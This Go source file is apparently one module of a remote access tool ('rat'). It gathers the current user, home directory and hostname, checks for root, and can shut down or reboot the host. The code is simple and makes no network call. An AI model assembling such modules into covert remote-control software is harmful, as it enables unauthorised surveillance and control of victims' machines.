//+build !windows

package computer

import (
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"rat/internal"
)

func GetComputerInformation() shared.Computer {
	u, err := user.Current()

	if err != nil {
		fmt.Println(err.Error())
	}

	info := shared.Computer{}

	info.Username = u.Username
	info.HomeDir = u.HomeDir

	hostname, err := os.Hostname()

	if err != nil {
		fmt.Println(err.Error())
	}

	info.Hostname = hostname

	return info
}

func IsRoot() bool {
	return GetComputerInformation().Username == "root"
}

func Shutdown() {
	exec.Command("shutdown", "-h", "now").Start()
}

func Reboot() {
	exec.Command("shutdown", "-r", "now").Start()
}
